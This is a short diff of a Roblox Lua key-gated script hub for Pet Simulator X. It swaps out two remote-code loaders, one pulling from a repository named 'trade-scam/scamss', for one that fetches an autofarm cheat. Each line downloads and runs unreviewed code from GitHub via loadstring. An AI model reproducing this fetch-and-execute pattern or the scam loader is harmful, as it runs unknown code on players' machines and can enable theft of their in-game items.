@@ -13,8 +13,7 @@ _G.Key = "shooter2.0"
 _G.KeyInput = "string"
 
 function MakeScriptHub()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Shmoly/fuck-psx/main/PsxCatLoadingScript.lua"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/subhian922/trade-scam/main/scamss"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/subhian922/autofarm/main/psxautofarm.lua"))()
 end
 
 function CorrectKeyNotification()
